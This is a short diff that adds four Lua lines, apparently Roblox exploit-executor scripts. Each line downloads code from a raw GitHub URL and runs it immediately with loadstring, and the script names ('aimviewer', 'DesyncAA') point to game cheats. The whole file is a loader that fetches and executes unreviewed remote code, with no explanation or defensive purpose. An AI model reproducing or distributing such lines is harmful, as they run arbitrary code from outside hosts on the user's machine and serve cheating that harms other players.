@@ -1,0 +1,4 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/angry0cat/oo/main/premium'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/88fear/script/main/aimviewer"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/angry0cat/86767/main/underground"))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ChaseSYNX/Scripts/main/DesyncAA'))()
